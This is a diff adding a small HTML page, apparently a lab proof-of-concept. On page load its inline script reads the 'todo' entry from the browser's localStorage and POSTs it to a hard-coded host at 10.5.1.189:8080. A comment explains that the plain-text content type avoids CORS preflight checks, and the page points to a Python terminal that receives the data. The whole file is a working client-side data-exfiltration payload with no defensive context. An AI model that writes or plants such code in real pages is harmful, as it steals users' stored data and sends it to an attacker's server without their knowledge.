@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Storage Transfer Test</title>
+</head>
+<body>
+    <h1>Data Transfer Test</h1>
+    <p>Check your Python terminal for the output.</p>
+
+    <script>
+        // Function to extract and send data
+        async function transferData() {
+            // 1. Get the 'todo' value from Local Storage
+            const todoValue = localStorage.getItem('todo');
+
+            if (!todoValue) {
+                console.error("Target key 'todo' not found in Local Storage.");
+                return;
+            }
+
+            console.log("Found data, attempting to send...");
+
+            try {
+                // 2. Send the data via a POST request
+                const response = await fetch('http://10.5.1.189:8080', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'text/plain' // Using plain text to avoid complex CORS preflights
+                    },
+                    body: todoValue
+                });
+
+                const result = await response.text();
+                console.log("Server response:", result);
+            } catch (error) {
+                console.error("Transfer failed:", error);
+            }
+        }
+
+        // Run the function immediately
+        transferData();
+    </script>
+</body>
+</html>
